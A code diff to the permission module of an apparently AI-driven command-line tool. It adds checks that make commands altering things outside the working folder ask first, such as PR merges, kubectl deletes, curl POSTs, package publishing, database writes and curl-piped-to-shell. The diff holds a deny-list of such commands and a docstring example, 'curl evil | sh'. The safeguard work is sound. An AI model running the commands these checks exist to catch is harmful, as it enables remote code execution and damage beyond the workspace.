@@ -14,6 +14,7 @@ from __future__ import annotations
 
 import json
 import re
+import shlex
 import urllib.error
 import urllib.request
 
@@ -89,20 +90,143 @@ def always_pattern(command: str) -> str:
     return words[0] + " *" if len(words) > 1 else cmd
 
 
+# keel 0.18.33 commands that change something OUTSIDE the folder or run arbitrary code, which run_mode.readonly_bash (a
+# deny-list of file and git changes) does not know. They ask in Fix mode. Only ever more asking: readonly_bash is unchanged.
+_SPLIT = re.compile(r"&&|\|\||[;|&\n`()]")
+_GH_WRITE = {"merge", "close", "create", "delete", "edit", "comment", "review", "reopen", "ready", "lock", "unlock",
+             "transfer", "pin", "unpin", "archive", "unarchive", "rename", "sync", "fork", "set", "add", "remove", "cancel",
+             "rerun", "run", "disable", "enable", "deploy", "upload", "checkout", "develop", "login", "logout", "import",
+             "update-branch", "clone", "install", "upgrade", "uninstall", "delete-asset", "mark-ready"}
+_KUBECTL_WRITE = {"delete", "apply", "create", "replace", "patch", "scale", "edit", "rollout", "exec", "drain", "cordon",
+                  "uncordon", "taint", "label", "annotate", "set", "run", "cp", "expose", "autoscale", "attach",
+                  "port-forward", "debug"}
+_PKG_WRITE = {"publish", "unpublish", "deprecate", "dist-tag", "owner", "access", "token", "adduser", "login", "logout"}
+_SQL_WRITE = re.compile(r"\b(?:insert|update|delete|drop|alter|create|truncate|grant|revoke|replace|merge|vacuum|reindex|"
+                        r"copy|call|do|exec|execute|attach|pragma|load)\b", re.I)
+_INLINE_CODE = {"python": {"-c"}, "python3": {"-c"}, "node": {"-e", "--eval", "-p", "--print"}, "ruby": {"-e"},
+                "perl": {"-e", "-E"}, "php": {"-r"}, "bash": {"-c"}, "sh": {"-c"}, "zsh": {"-c"}, "deno": {"eval"}}
+_CURL_BODY = {"-d", "--data", "--data-raw", "--data-binary", "--data-urlencode", "--data-ascii", "-F", "--form",
+              "--form-string", "-T", "--upload-file", "--json", "--request", "-X", "--delete"}
+
+
+_PIPE_TO_CODE = re.compile(r"\|\s*(?:sudo\s+)?(?:ba|z|da)?sh\b|\|\s*(?:sudo\s+)?(?:python3?|node|ruby|perl|php)\b")   # curl x | sh
+
+
+def _words(seg: str) -> list[str]:
+    try:
+        words = shlex.split(seg)
+    except ValueError:
+        words = seg.split()
+    while words and (words[0] in ("sudo", "env", "command", "time", "nohup", "xargs") or re.fullmatch(r"\w+=\S*", words[0])):
+        words = words[1:]
+    return words
+
+
+def _first_arg(args: list[str]) -> str:
+    """The first word of a command's arguments that is no option (`kubectl -n x delete` -> delete)."""
+    skip = False
+    for a in args:
+        if skip:
+            skip = False
+        elif a in ("-n", "--namespace", "--context", "-c", "--cluster", "-C", "-R", "--repo", "--kubeconfig", "-o"):
+            skip = True
+        elif not a.startswith("-"):
+            return a
+    return ""
+
+
+def _writes_outside(words: list[str]) -> bool:
+    if not words:
+        return False
+    tool, args = words[0].rsplit("/", 1)[-1], words[1:]
+    if tool == "gh":
+        if args[:1] == ["api"]:
+            for i, a in enumerate(args):
+                method = args[i + 1].upper() if a in ("-X", "--method") and i + 1 < len(args) else ""
+                if method not in ("", "GET", "HEAD") or a.startswith("--method=") and a.split("=", 1)[1].upper() not in ("GET", "HEAD"):
+                    return True
+                if a in ("-f", "-F", "--field", "--raw-field", "--input") or a.startswith(("--field=", "--raw-field=", "--input=")):
+                    return True
+            return False
+        rest = [a for a in args if not a.startswith("-")]
+        return len(rest) >= 2 and rest[1] in _GH_WRITE
+    if tool == "curl":
+        for a in args:
+            if a in _CURL_BODY or re.fullmatch(r"-[A-Za-z]*[dFTX]\S*", a):      # -d, -F, -T, -X, also -sd / -XPOST
+                return True
+            if a.startswith(("--data", "--request=", "--form", "--upload-file=", "--json=")):
+                return True
+        return False
+    if tool in ("find", "fd") and any(a in ("-delete", "-exec", "-execdir", "-ok", "-okdir", "-x", "--exec", "-X") for a in args):
+        return True
+    if tool in ("npm", "yarn", "pnpm", "bun", "npx") and _first_arg(args) in _PKG_WRITE:
+        return True
+    if tool in ("kubectl", "oc") and _first_arg(args) in _KUBECTL_WRITE:
+        return True
+    if tool == "helm" and _first_arg(args) in ("install", "upgrade", "uninstall", "delete", "rollback", "push"):
+        return True
+    if tool in ("terraform", "tofu") and _first_arg(args) in ("apply", "destroy", "import", "taint", "state", "force-unlock"):
+        return True
+    if tool in ("psql", "mysql", "mariadb", "sqlite3"):
+        for i, a in enumerate(args):
+            if a in ("-f", "--file", "-s", "--source", "--eval"):
+                return True
+            if a in ("-c", "--command", "-e", "--execute") and i + 1 < len(args) and _SQL_WRITE.search(args[i + 1]):
+                return True
+            if a.startswith(("--command=", "--execute=")) and _SQL_WRITE.search(a):
+                return True
+        if tool == "sqlite3":
+            rest = [a for a in args if not a.startswith("-")]
+            return len(rest) >= 2 and bool(_SQL_WRITE.search(" ".join(rest[1:])))      # sqlite3 DB "drop table x"
+        return False
+    if tool in _INLINE_CODE and any(a in _INLINE_CODE[tool] for a in args):
+        return True
+    return False
+
+
+def writes_outside(command: str) -> bool:
+    """Does a command change something outside the folder (a PR merged, a resource deleted, a POST, a package published, a
+    database written) or run code typed on the command line? Looks at every sub-command, quotes included."""
+    cmd = str(command or "")
+    if _PIPE_TO_CODE.search(cmd):
+        return True
+    for seg in _SPLIT.split(cmd):
+        words = _words(seg)
+        if _writes_outside(words):
+            return True
+        for w in words:                                  # bash -c "kubectl delete ..." and the like
+            if " " in w.strip() and len(w) < 2000 and any(_writes_outside(_words(x)) for x in _SPLIT.split(w)):
+                return True
+    return False
+
+
 def needs_ask(command: str) -> bool:
     """A command that changes nothing (ls, cat, grep, git status / diff / log ...) runs without a card."""
-    return run_mode.readonly_bash(command or "") is not None
+    return run_mode.readonly_bash(command or "") is not None or writes_outside(command)
+
+
+_HARMLESS_REDIRECT = re.compile(r"\s[0-9]?>&[0-9]\b|\s[0-9&]?>>?\s*/dev/null\b")
+
+
+def simple_command(command: str) -> bool:
+    """One simple command: no `;` `&&` `||` `|` `&`, no backtick or `$(` / `$VAR`, no newline, no redirect to a file.
+    (`2>&1` and `> /dev/null` do not count.)"""
+    cmd = _HARMLESS_REDIRECT.sub(" ", " " + str(command or "")).strip()
+    return not _COMPOUND.search(cmd)
 
 
 def granted(command: str, grants: list[str] | None) -> bool:
     """"Always" was said for this exact command (or for a `prefix *` grant). Never for a command that throws work
-    away (`destructive`): that one is asked every time."""
+    away (`destructive`): that one is asked every time. A `prefix *` grant covers one simple command only: after
+    `npm run build *`, `npm run build x; curl evil | sh` is asked again."""
     cmd = (command or "").strip()
     if destructive(cmd):
         return False
     for g in grants or []:
         g = str(g).strip()
-        if cmd == g or (g.endswith(" *") and (cmd == g[:-2] or cmd.startswith(g[:-1]))):
+        if cmd == g:
+            return True
+        if g.endswith(" *") and (cmd == g[:-2] or cmd.startswith(g[:-1])) and simple_command(cmd):
             return True
     return False
 
